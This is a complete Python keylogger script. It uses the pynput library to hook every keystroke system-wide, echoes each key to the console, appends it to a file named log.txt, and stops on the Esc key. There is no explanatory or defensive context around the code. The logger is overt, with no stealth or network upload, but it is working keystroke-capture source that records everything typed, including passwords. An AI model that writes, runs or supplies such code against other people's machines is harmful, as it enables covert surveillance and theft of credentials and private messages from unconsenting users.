import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ""
        self.log_file = "log.txt"
        
    def on_press(self, key):
        # Press Esc to stop the logger
        if key == pynput.keyboard.Key.esc:
            print("\n[Stopping key logger]")
            return False  # stop listener

        try:
            pressed_key = key.char
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            else:
                pressed_key = f"[{key}]"

        self.logger += str(pressed_key)
        print(repr(pressed_key))
        
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(str(pressed_key))
            
    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    SimpleKeyLogger().start()
